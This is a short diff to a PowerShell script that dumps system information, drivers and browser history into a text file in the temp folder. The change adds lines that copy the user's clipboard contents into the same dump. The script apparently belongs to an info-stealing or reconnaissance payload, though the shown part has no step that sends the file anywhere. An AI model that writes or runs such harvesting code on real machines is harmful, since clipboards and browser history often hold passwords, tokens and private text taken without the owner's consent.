@@ -108,6 +108,8 @@ $outpath = "$env:temp\systeminfo.txt"
 "Drivers            : $drivers" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+(Get-Clipboard | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($Value| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
